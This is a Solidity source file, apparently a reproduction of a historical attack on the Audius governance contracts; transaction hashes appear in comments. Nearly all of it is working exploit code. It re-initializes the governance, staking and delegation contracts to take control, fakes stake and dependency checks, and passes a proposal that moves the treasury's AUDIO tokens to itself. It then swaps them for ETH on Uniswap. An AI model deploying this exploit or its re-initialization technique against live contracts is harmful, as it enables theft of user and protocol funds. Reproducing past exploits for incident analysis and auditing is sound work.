// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@uniswap/v2-periphery/interfaces/IUniswapV2Router02.sol";
import "./AudiusInterfaces.sol";

contract AudiusExploitWithProposal {
    address constant governanceAddress =
        0x4DEcA517D6817B6510798b7328F2314d3003AbAC;
    IGovernance constant governance = IGovernance(governanceAddress);
    address constant stakingAddress = 0xe6D97B2099F142513be7A2a068bE040656Ae4591;
    IStaking constant staking = IStaking(stakingAddress);
    address constant dmanagerAddress =
        0x4d7968ebfD390D5E7926Cb3587C39eFf2F9FB225;
    IDelegateManagerV2 constant dmanager = IDelegateManagerV2(dmanagerAddress);
    address constant audioTokenAddress =
        0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998;
    ERC20 constant audioToken = ERC20(audioTokenAddress);
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant router = IUniswapV2Router02(routerAddress);

    function initializeAudiusAndSubmitProposal() external {
        // tx: 0xfefd829e246002a8fd061eede7501bccb6e244a9aacea0ebceaecef5d877a984
        governance.initialize({
            _registryAddress: address(this),
            _votingPeriod: 3,
            _executionDelay: 0,
            _votingQuorumPercent: 1,
            _maxInProgressProposals: 4,
            _guardianAddress: address(this)
        });

        governance.evaluateProposalOutcome(84);

        // Submit a proposal to transfer all AUDIO tokens in the Governance Contract to the Exploiter Contract.
        governance.submitProposal({
            _targetContractRegistryKey: bytes32(""),
            _callValue: 0,
            _functionSignature: "transfer(address,uint256)",
            _callData: abi.encode(
                address(this), audioToken.balanceOf(governanceAddress)
                ),
            _name: " ",
            _description: " "
        });

        staking.initialize({
            _tokenAddress: address(this),
            _governanceAddress: address(governance)
        });

        dmanager.initialize({
            _tokenAddress: address(this),
            _governanceAddress: address(this),
            _undelegateLockupDuration: 1
        });
        dmanager.setServiceProviderFactoryAddress(address(this));

        dmanager.delegateStake(address(this), 110000000000000000000000000000); // Must be >1% of totalStaked to evaluate votes
    }

    // tx: 0x3c09c6306b67737227edc24c663462d870e7c2bf39e9ab66877a980c900dd5d5 at 15201796
    function vote() external {
        governance.submitVote(85, Vote.Yes);
    }

    function evaluateAndTransfer() external {
        // tx: 0x4227bca8ed4b8915c7eec0e14ad3748a88c4371d4176e716e8007249b9980dc9 at 15201799
        governance.evaluateProposalOutcome(85);

        // tx: 0x82fc23992c7433fffad0e28a1b8d11211dc4377de83e88088d79f24f4a3f28b3
        // Swap from AUDIO to ETH
        audioToken.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = audioTokenAddress;
        path[1] = router.WETH();
        router.swapExactTokensForETH(
            audioToken.balanceOf(address(this)),
            680 ether,
            path,
            msg.sender,
            block.timestamp
        );
    }

    function getContract(bytes32)
        external
        pure
        returns (address)
    {
        return audioTokenAddress;
    }

    function isGovernanceAddress() external pure returns (bool) {
        return true;
    }

    function getExecutionDelay() external pure returns (uint256) {
        return 0;
    }

    function getVotingPeriod() external pure returns (uint256) {
        return 0;
    }

    function transferFrom(address, address, uint256)
        external
        pure
        returns (bool)
    {
        return true;
    }

    function validateAccountStakeBalance(address) external pure {}
}